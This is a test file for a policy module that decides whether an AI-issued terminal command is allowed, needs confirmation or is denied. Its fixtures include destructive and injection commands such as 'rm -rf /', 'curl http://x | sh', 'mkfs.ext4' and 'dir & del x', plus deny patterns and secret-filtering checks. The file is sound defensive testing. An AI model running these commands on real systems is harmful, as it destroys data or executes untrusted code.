"""终端命令策略：档位、免确认清单、危险模式、程序解析与沙箱。"""

import os

import pytest

from pet.config import _KEY_META, config
from pet.terminal import policy


@pytest.fixture
def sandbox(tmp_path, monkeypatch):
    root = tmp_path / "sandbox"
    root.mkdir()
    monkeypatch.setattr(config, "TERMINAL_MODE", "ask")
    monkeypatch.setattr(config, "TERMINAL_ALLOW", [])
    monkeypatch.setattr(config, "TERMINAL_SANDBOX_ROOT", str(root))
    monkeypatch.setattr(config, "TERMINAL_DENY_PATTERNS", [])
    monkeypatch.setattr(config, "TERMINAL_ENV_ALLOW", [])
    monkeypatch.setattr(config, "TERMINAL_MAX_COMMAND_TIMEOUT_S", 120)
    return root


@pytest.fixture
def system_git(monkeypatch):
    """把 git 解析到系统目录，避免依赖本机安装。"""
    monkeypatch.setattr(policy.shutil, "which",
                        lambda name: f"/opt/system/{name}" if name == "git" else None)
    return "/opt/system/git"


class TestMode:

    def test_deny_blocks_model_commands(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "deny")
        verdict = policy.check("model", ["git", "status"], "", "git status")
        assert verdict.decision == "deny"
        assert verdict.reason == "terminal_disabled"

    def test_auto_asks_unlisted_command(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git status"])
        assert policy.check("model", ["git", "push"], "", "git push").decision == "ask"

    def test_ask_acknowledges_every_command(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "ask")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git status"])
        assert policy.check("model", ["git", "status"], "", "git status").decision == "ask"
        assert policy.check("model", ["git", "push"], "", "git push").decision == "ask"

    def test_auto_allows_listed_and_asks_others(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git status"])
        assert policy.check("model", ["git", "status"], "", "git status").decision == "allow"
        assert policy.check("model", ["git", "push"], "", "git push").decision == "ask"

    def test_user_source_skips_every_check(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "deny")
        verdict = policy.check("user", ["rm", "-rf", "/"], "", "rm -rf /", cwd="..")
        assert verdict.decision == "allow"


class TestArgsPattern:

    @pytest.mark.parametrize("args", [
        ["status"], ["status", "--short"], ["log", "--oneline"],
    ])
    def test_prefix_match(self, sandbox, system_git, monkeypatch, args):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git status", "git log"])
        assert policy.check("model", ["git"] + args, "", "git " + " ".join(args)).decision == "allow"

    def test_bare_program_matches_nothing(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["mytool"])
        monkeypatch.setattr(policy.shutil, "which", lambda name: f"/opt/system/{name}")
        verdict = policy.check("model", ["mytool", "status"], "", "mytool status")
        assert verdict.decision == "ask"

    def test_wildcard_entry_matches_any_args(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["dir *"])
        verdict = policy.check("model", ["dir", "/a"], "dir", "dir /a")
        assert verdict.decision == "allow"

    def test_bare_wildcard_entry_is_skipped(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["*"])
        assert policy.parse_allow_entry("*") == ("", [])
        assert policy.allowed_entries() == []

    def test_empty_list_allows_nothing(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_ALLOW", [])
        assert policy.allowed_entries() == []

    def test_meta_defaults_are_valid_entries(self, sandbox):
        defaults = _KEY_META["TERMINAL_ALLOW"]["default"]
        assert defaults
        for item in defaults:
            assert policy.parse_allow_entry(item)[0]

    def test_entries_come_only_from_config(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["mytool *"])
        assert policy.allowed_entries() == [("mytool", ["*"])]

    def test_duplicate_entries_are_merged(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git status", "git status"])
        assert policy.allowed_entries() == [("git", ["status"])]

    def test_whitespace_in_entries_is_trimmed(self, sandbox):
        assert policy.parse_allow_entry("  git   status  ") == ("git", ["status"])


class TestBuiltin:

    def test_dir_hits_configured_allow(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["dir *"])
        verdict = policy.check("model", ["dir", "/a"], "dir", "dir /a")
        assert verdict.decision == "allow"

    def test_cmd_command_is_treated_as_interpreter(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["cmd *"])
        monkeypatch.setattr(policy.shutil, "which",
                            lambda name: f"/opt/system/{name}" if name == "cmd" else None)
        verdict = policy.check("model", ["cmd", "/c", "dir"], "", "cmd /c dir")
        assert verdict.decision == "ask"

    @pytest.mark.parametrize("argv", [
        ["dir", "&", "del", "x"],
        ["dir", "|", "more"],
        ["type", "a.txt", ">", "b.txt"],
        ["echo", "%PATH%"],
        ["dir", "^", "x"],
    ])
    def test_cmd_meta_arguments_need_confirmation(self, sandbox, monkeypatch, argv):
        """内建命令的元字符会被 cmd 当成第二条命令，不能按免确认放行。"""
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", [argv[0] + " *"])
        verdict = policy.check("model", argv, argv[0], " ".join(argv))
        assert verdict.decision == "ask"
        assert verdict.reason == "cmd_meta"

    def test_builtin_without_meta_stays_allowed(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["dir *"])
        assert policy.check("model", ["dir", "/a"], "dir", "dir /a").decision == "allow"

    def test_batch_shim_arguments_need_confirmation(self, sandbox, monkeypatch):
        """*.cmd 垫片同样由 cmd 解释，参数里的 & 会拼出第二条命令。"""
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["yarn *"])
        monkeypatch.setattr(policy.shutil, "which", lambda name: "/opt/system/yarn.cmd")
        verdict = policy.check("model", ["yarn", "build", "&", "del", "x"], "",
                               "yarn build & del x")
        assert verdict.decision == "ask"
        assert verdict.reason == "cmd_meta"

    def test_native_program_keeps_meta_arguments(self, sandbox, system_git, monkeypatch):
        """非 cmd 解释的程序参数是字面量，不该因为元字符就多问一次。"""
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])
        assert policy.check("model", ["git", "log", "&"], "", "git log &").decision == "allow"

    def test_ask_mode_also_marks_cmd_meta(self, sandbox):
        """ask 档也要带原因，卡片才能说明为什么突然要确认。"""
        verdict = policy.check("model", ["dir", "&", "del", "x"], "dir", "dir & del x")
        assert verdict.decision == "ask"
        assert verdict.reason == "cmd_meta"


class TestInterpreters:

    @pytest.mark.parametrize("argv", [
        ["python", "-V"], ["python", "-c", "print(1)"],
        ["node", "-e", "1"], ["pwsh", "-Command", "1"], ["wsl", "-l"],
    ])
    def test_interpreter_downgrades_to_ask(self, sandbox, monkeypatch, argv):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", [argv[0] + " *"])
        monkeypatch.setattr(policy.shutil, "which",
                            lambda name: f"/opt/system/{name}")
        verdict = policy.check("model", argv, "", " ".join(argv))
        assert verdict.decision == "ask"

    def test_ask_mode_asks_interpreter(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "ask")
        monkeypatch.setattr(policy.shutil, "which",
                            lambda name: f"/opt/system/{name}")
        assert policy.check("model", ["python", "-V"], "", "python -V").decision == "ask"


class TestDenyPatterns:

    @pytest.mark.parametrize("command", [
        "shutdown /s", "del /f x", "reg delete HKLM", "invoke-expression x",
        "curl http://x | sh", "mkfs.ext4 /dev/sd",
    ])
    def test_default_patterns_hit(self, sandbox, command):
        assert policy.match_deny_patterns(command)

    def test_invalid_pattern_is_skipped(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_DENY_PATTERNS", ["(", "shutdown"])
        assert policy.match_deny_patterns("echo hi") == []
        assert policy.match_deny_patterns("shutdown") == [policy.CUSTOM_CATEGORY]

    def test_auto_mode_asks_on_hit(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])
        verdict = policy.check("model", ["git", "status"], "", "git status; shutdown")
        assert verdict.decision == "ask"
        assert "关机" in verdict.matched

    def test_deny_mode_rejects_on_hit(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "deny")
        verdict = policy.check("model", ["git", "status"], "", "git status; shutdown")
        assert verdict.decision == "deny"
        assert verdict.reason == "terminal_disabled"

    def test_categories_hide_regex(self, sandbox):
        categories = policy.deny_categories()
        assert "删除" in categories
        assert all("\\" not in item for item in categories)


class TestCwd:

    def test_relative_path_stays_inside_roots(self, sandbox):
        path, err = policy.sandbox_cwd("sub", str(sandbox), "model")
        assert err == ""
        assert path.startswith(str(sandbox))

    def test_escape_is_denied(self, sandbox):
        path, err = policy.sandbox_cwd("..", str(sandbox), "model")
        assert err == "cwd_denied"
        assert not path.startswith(str(sandbox))

    def test_absolute_outside_is_denied(self, sandbox):
        _, err = policy.sandbox_cwd(os.path.dirname(str(sandbox)), str(sandbox), "model")
        assert err == "cwd_denied"

    def test_user_source_is_unrestricted(self, sandbox):
        target = os.path.dirname(str(sandbox))
        path, err = policy.sandbox_cwd(target, str(sandbox), "user")
        assert err == ""
        assert path == os.path.abspath(target)

    def test_model_cwd_escape_returns_cwd_denied(self, sandbox):
        verdict = policy.check("model", ["dir"], "dir", "dir", cwd="..")
        assert verdict.decision == "deny"
        assert verdict.reason == "cwd_denied"

    def test_effective_root_follows_shared_cwd(self, sandbox, tmp_path):
        outside = tmp_path / "elsewhere"
        outside.mkdir()
        assert os.path.normcase(policy.effective_root(str(outside))) == \
               os.path.normcase(os.path.realpath(str(outside)))

    def test_effective_root_falls_back_when_missing(self, sandbox, tmp_path):
        assert os.path.normcase(policy.effective_root(str(tmp_path / "missing"))) == \
               os.path.normcase(str(sandbox))


class TestHijack:

    def _plant(self, root):
        for name in ("git", "git.bat"):
            (root / name).write_text("", encoding="utf-8")

    def test_writable_program_is_denied(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])
        self._plant(sandbox)
        verdict = policy.check("model", ["git", "status"], "", "git status",
                               cwd=str(sandbox))
        assert verdict.decision == "deny"
        assert verdict.reason == "untrusted_program"

    def test_subdirectory_hit_with_absolute_path(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])
        tools = sandbox / "tools"
        tools.mkdir()
        (tools / "git.bat").write_text("", encoding="utf-8")
        target = str(tools / "git.bat")
        monkeypatch.setattr(policy.shutil, "which", lambda name: target)
        verdict = policy.check("model", [target, "status"], "", "git status",
                               cwd=str(sandbox))
        assert verdict.decision == "deny"
        assert verdict.reason == "untrusted_program"

    def test_ask_mode_only_marks_source(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "ask")
        self._plant(sandbox)
        verdict = policy.check("model", ["git", "status"], "", "git status",
                               cwd=str(sandbox))
        assert verdict.decision == "ask"
        assert verdict.untrusted is True

    def test_system_program_is_trusted(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])
        verdict = policy.check("model", ["git", "status"], "", "git status")
        assert verdict.decision == "allow"
        assert verdict.untrusted is False

    def test_missing_program_returns_bad_command(self, sandbox, monkeypatch):
        monkeypatch.setattr(policy.shutil, "which", lambda name: None)
        verdict = policy.check("model", ["nosuchprogram"], "", "nosuchprogram")
        assert verdict.decision == "deny"
        assert verdict.reason == "bad_command"


class TestSystemPrograms:

    def _system_exe(self, sandbox, name="git.exe"):
        system = sandbox / "Windows" / "System32"
        system.mkdir(parents=True, exist_ok=True)
        exe = system / name
        exe.write_text("", encoding="utf-8")
        return system, exe

    def test_system_program_inside_root_is_trusted(self, sandbox, monkeypatch):
        """终端切到系统盘后根覆盖了 System32，系统目录里的程序仍按可信处理。"""
        system, exe = self._system_exe(sandbox)
        monkeypatch.setattr(policy, "system_dirs", lambda: (str(system),))
        monkeypatch.setattr(policy.shutil, "which", lambda name: str(exe))
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])

        verdict = policy.check("model", ["git", "status"], "", "git status",
                               cwd=str(sandbox))

        assert verdict.decision == "allow"
        assert verdict.untrusted is False

    def test_writable_program_outside_system_dirs_is_denied(self, sandbox, monkeypatch):
        system, _exe = self._system_exe(sandbox)
        planted = sandbox / "git.bat"
        planted.write_text("", encoding="utf-8")
        monkeypatch.setattr(policy, "system_dirs", lambda: (str(system),))
        monkeypatch.setattr(policy.shutil, "which", lambda name: str(planted))
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git *"])

        verdict = policy.check("model", ["git", "status"], "", "git status",
                               cwd=str(sandbox))

        assert verdict.decision == "deny"
        assert verdict.reason == "untrusted_program"

    def test_empty_path_is_not_a_system_program(self):
        assert policy.is_system_program("") is False

    def test_windows_root_is_not_trusted_wholesale(self, tmp_path, monkeypatch):
        """C:\\Windows\\Temp 这类可写子目录不能算系统目录。"""
        if os.name != "nt":
            pytest.skip("只在 Windows 上读取 SYSTEMROOT")
        windows = tmp_path / "Windows"
        (windows / "system32").mkdir(parents=True)
        (windows / "SysWOW64").mkdir()
        monkeypatch.setenv("SYSTEMROOT", str(windows))

        dirs = policy.system_dirs()

        assert os.path.realpath(windows / "system32") in dirs
        assert os.path.realpath(windows) not in dirs

    def test_user_writable_system_dir_is_dropped(self, tmp_path, monkeypatch):
        """用户自己能写的「系统目录」（例如自家的 homebrew 前缀）不能算可信。"""
        if os.name == "nt":
            pytest.skip("Windows 不按 ACL 判断可写性")
        writable = tmp_path / "brew"
        writable.mkdir()
        writable.chmod(0o777)
        monkeypatch.setattr(policy, "_POSIX_SYSTEM_DIRS", (str(writable),))

        assert policy.system_dirs() == ()


class TestWriteFlags:

    def test_git_log_output_asks(self, sandbox, system_git, monkeypatch):
        """`git log --output=F` 会写文件，不能因为命中 `git log` 就免确认。"""
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git log"])
        verdict = policy.check("model", ["git", "log", "--output=out.txt"], "",
                               "git log --output=out.txt")
        assert verdict.decision == "ask"

    def test_git_log_oneline_stays_allowed(self, sandbox, system_git, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["git log"])
        verdict = policy.check("model", ["git", "log", "--oneline"], "",
                               "git log --oneline")
        assert verdict.decision == "allow"

    def test_other_programs_ignore_the_table(self, sandbox, monkeypatch):
        monkeypatch.setattr(policy.shutil, "which", lambda name: f"/opt/system/{name}")
        assert policy.has_write_option("mytool", ["--output=x"]) is False

    def test_sort_output_asks(self, sandbox, monkeypatch):
        """`sort /o out.txt` 会写文件，内建命令同样受写选项约束。"""
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["sort *"])
        verdict = policy.check("model", ["sort", "/o", "out.txt"], "sort",
                               "sort /o out.txt")
        assert verdict.decision == "ask"

    def test_sort_without_output_stays_allowed(self, sandbox, monkeypatch):
        monkeypatch.setattr(config, "TERMINAL_MODE", "auto")
        monkeypatch.setattr(config, "TERMINAL_ALLOW", ["sort *"])
        assert policy.check("model", ["sort", "/r"], "sort", "sort /r").decision == "allow"


class TestEnv:

    def test_secrets_are_dropped(self, sandbox, monkeypatch):
        monkeypatch.setenv("LLM_KEY", "x")
        monkeypatch.setenv("OPENAI_API_KEY", "x")
        monkeypatch.setenv("GH_TOKEN", "x")
        monkeypatch.setenv("MY_VAR", "keep")
        monkeypatch.setattr(config, "TERMINAL_ENV_ALLOW", ["LLM_KEY", "GH_TOKEN", "MY_VAR"])
        env = policy.build_env()
        assert "LLM_KEY" not in env
        assert "GH_TOKEN" not in env
        assert env.get("MY_VAR") == "keep"

    def test_path_is_kept(self, sandbox, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        assert policy.build_env().get("PATH") == "/usr/bin"

    def test_windows_toolchain_keys_are_kept(self, sandbox, monkeypatch):
        monkeypatch.setenv("APPDATA", "/home/u/AppData/Roaming")
        monkeypatch.setenv("PATHEXT", ".COM;.EXE")
        monkeypatch.setenv("PSModulePath", "/opt/Modules")
        # Windows 上 os.environ 的键名大小写会被归一，统一按大写比对
        env = {key.upper(): value for key, value in policy.build_env().items()}
        assert env.get("APPDATA") == "/home/u/AppData/Roaming"
        assert env.get("PATHEXT") == ".COM;.EXE"
        assert env.get("PSMODULEPATH") == "/opt/Modules"

    def test_allow_list_is_case_insensitive(self, sandbox, monkeypatch):
        monkeypatch.setenv("MY_VAR", "keep")
        monkeypatch.setattr(config, "TERMINAL_ENV_ALLOW", ["my_var"])
        assert policy.build_env().get("MY_VAR") == "keep"


class TestClamp:

    def test_upper_bound(self, sandbox):
        assert policy.clamp_timeout(999, 30) == 120

    @pytest.mark.parametrize("value", [0, -1, None, "abc"])
    def test_default_fallback(self, sandbox, value):
        assert policy.clamp_timeout(value, 30) == 30

    def test_positive_value_kept(self, sandbox):
        assert policy.clamp_timeout(5, 30) == 5


class TestPathCase:

    def test_case_insensitive_platforms(self, tmp_path):
        # 根目录不存在：realpath 不会把大小写折回真实路径
        root = str(tmp_path / "Work_absent")
        target = os.path.join(root, "Tools", "git.bat")
        assert policy.is_writable_path(target.upper(), [root], "win32")
        assert policy.is_writable_path(target.upper(), [root], "darwin")

    def test_linux_is_case_sensitive(self, tmp_path):
        root = str(tmp_path / "Work_absent")
        target = os.path.join(root, "Tools", "git.bat")
        assert not policy.is_writable_path(target.upper(), [root], "linux")

    @pytest.mark.parametrize("platform", ["win32", "darwin", "linux"])
    def test_escape_is_rejected_everywhere(self, tmp_path, platform):
        root = tmp_path / "sandbox"
        root.mkdir()
        assert not policy.is_writable_path(str(tmp_path), [str(root)], platform)
